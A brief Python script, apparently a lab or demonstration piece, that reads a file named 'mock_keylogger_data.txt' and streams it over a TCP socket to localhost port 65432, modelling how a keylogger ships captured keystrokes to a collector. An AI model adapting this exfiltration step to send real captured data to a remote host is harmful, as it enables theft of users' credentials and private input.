import socket

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect(('localhost', 65432))  
        
        with open('mock_keylogger_data.txt', 'rb') as f:  
            while True:
                bytes_read = f.read(1024)  
                if not bytes_read:
                    break  
                client_socket.sendall(bytes_read)  

if __name__ == "__main__":
    main()
